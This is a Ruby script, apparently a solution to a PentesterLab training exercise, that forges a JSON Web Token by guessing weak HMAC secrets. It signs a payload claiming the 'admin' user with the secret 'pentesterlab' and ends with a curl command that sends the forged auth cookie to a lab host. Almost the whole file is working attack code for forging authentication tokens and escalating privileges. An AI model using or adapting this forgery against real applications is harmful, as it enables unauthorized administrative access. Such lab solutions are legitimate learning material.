# this exploit has so many secrets to figure out which of the 5 patch the original cookie signature that I was given.
# Once i can make my own cookie that has the correct key then I can change my user to admin and make a valid cookie.

require 'base64'
require 'openssl'
require 'json'

# orig header = {"typ":"JWT","alg":"HS256"}
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
header = '{"typ":"JWT","alg":"HS256"}'#.to_json

# orig payload = '{"user":null}'
# eyJ1c2VyIjpudWxsfQ
payload = '{"user":"admin"}'#.to_json

data = Base64.strict_encode64(header).gsub("=","")+"."+Base64.strict_encode64(payload).gsub("=","")
# data.gsub!("=","")

# possible secrets:
# secret1 = "hacker"
# secret2 = "jwt"
# secret3 = "insecurity"
secret4 = "pentesterlab" #of course this would be the key...lol
# secret5 = "hacking"

# sig = 'Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM
# signature1 = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret1, data))
# signature2 = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret2, data))
# signature3 = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret3, data))
signature4 = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret4, data))
# signature5 = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret5, data))

# puts data+"."+signature1
# puts data+"."+signature2
# puts data+"."+signature3
puts data+"."+signature4
# puts data+"."+signature5




# curl -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.d9nOzQ6Dc-N077EOEhFVJdvA7ufgp8qb-fLLUkIyqZc=" http://ptl-c6b6c5f7-e80c6b1e.libcurl.so/